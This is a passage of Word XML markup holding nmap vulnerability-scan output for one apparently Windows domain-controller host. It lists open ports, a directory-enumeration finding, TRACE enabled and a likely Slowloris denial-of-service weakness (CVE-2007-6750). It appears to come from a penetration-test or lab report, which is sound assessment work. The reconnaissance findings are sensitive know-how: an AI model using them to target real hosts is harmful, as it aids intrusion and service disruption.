    </w:p>
    <w:p w14:paraId="1F3DF8DE" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27812A20" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">| smtp-vuln-cve2010-4344: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2139E06C" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>_  The</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> SMTP server is not Exim: NOT VULNERABLE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44635E0F" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|_sslv2-drown: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="331C4296" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">42/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  nameserver</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5E3345DD" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700C1329" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">53/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  domain</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1A4810F8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59BFC459" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">79/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  finger</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2CDC6466" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E045D45" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">80/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  http</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="287AED18" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE68112" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_http-csrf: Couldn't find any CSRF vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BF250BA" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_http-dombased-xss: Couldn't find any DOM based XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0FCA75" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">| http-enum: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD6D102" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|   /test.php: Test page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1CFFCA" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>_  /</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>icons/: Potentially interesting folder w/ directory listing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098D957E" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">| http-slowloris-check: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17ACC397" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|   VULNERABLE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D82FE7" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|   Slowloris DOS attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B285A9" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|     State: LIKELY VULNERABLE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBE8EF1" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|     IDs:  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>CVE:CVE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>-2007-6750</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757E98A0" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|       Slowloris tries to keep many connections to the target web server open and hold</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B2339B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|       them open </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>as long as</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> possible.  It accomplishes this by opening connections to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13726FFE" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|       the target web server and sending a partial request. By doing so, it starves</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283F1CF8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|       the http server's resources causing Denial </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> Service.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18472AB1" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3D7E8C" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|     Disclosure date: 2009-09-17</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2CAE2E" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|     References:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C22F526" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|       http://ha.ckers.org/slowloris/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242395DD" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0438F7B6" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1883ABFB" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_http-trace: TRACE is enabled</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E696BC4" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D57FECA" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">88/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  kerberos</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>-sec</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D67B40" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4643276F" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">99/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  metagram</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="194C975B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A574338" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">110/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  pop</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BA87EB" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EFD34A3" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|_sslv2-drown: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D92B35" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">135/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  msrpc</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="305B4980" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391F84A6" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">139/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  netbios</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>-ssn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0930A348" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F4C5DE" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">389/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  ldap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2E579EC8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72731CEB" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|_sslv2-drown: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45296167" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">445/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  microsoft</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>-ds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8A73F9" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
